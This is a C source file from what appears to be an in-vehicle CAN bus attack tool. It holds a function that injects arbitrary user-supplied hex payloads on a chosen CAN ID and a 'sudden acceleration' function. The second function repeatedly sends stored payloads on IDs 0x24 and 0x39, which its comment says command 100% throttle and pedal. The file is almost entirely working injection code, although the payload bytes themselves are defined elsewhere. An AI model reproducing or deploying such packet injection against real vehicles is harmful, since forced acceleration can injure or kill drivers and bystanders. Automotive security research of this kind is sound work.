#include "all_headers.h"

/*================================================================
replay.c
This function replays CAN packets with or without payloads.

functions:
- replay_replay: replays CAN packets with input payloads
- replay_suddenaccel: replays CAN packets with payloads (accel 100% && pedal 100%)

Parameters:
- socket: CAN socket
- addr: CAN address
==================================================================*/

void replay_replay(int socket, struct sockaddr_can *addr, int canid, int time_diff) {
    unsigned char input_data[8];
    int data_len = 0;

    printf("Enter payload to send in hexadecimal (e.g., 0x12 0xAB ...), up to 8 bytes\n");
    printf("type here >> ");
    char input_line[256];
    if (fgets(input_line, sizeof(input_line), stdin) != NULL) {
        char *token = strtok(input_line, " \t\n");
        while (token != NULL && data_len < 8) {
            unsigned int byte_value;
            if (sscanf(token, "%x", &byte_value) == 1) {
                input_data[data_len++] = (unsigned char)byte_value;
            } else {
                printf("Invalid input: %s\n", token);
            }
            token = strtok(NULL, " \t\n");
        }
        if (data_len == 0) {
            printf("No valid data entered.\n");
            return;
        }
    } else {
        printf("No input received.\n");
        return;
    }

    do {
        send_can_packet(socket, addr, input_data, data_len, canid);
        printf("Sent CAN ID: 0x%X, Data:", canid);
        for (int i = 0; i < data_len; i++) {
            printf(" 0x%02X", input_data[i]);
        }
        printf("\n");

        if (time_diff == 0) break;
        usleep(time_diff * 1000);
    } while (1);
}

void replay_suddenaccel(int socket, struct sockaddr_can *addr, int canid, int time_diff){
    do {
        send_can_packet(socket, addr, replay.payload1, replay.payload1_len, 0x24);
        send_can_packet(socket, addr, replay.payload2, replay.payload2_len, 0x39);
        if (time_diff == 0) break;
        usleep(time_diff * 1000);
    } while (1);
}
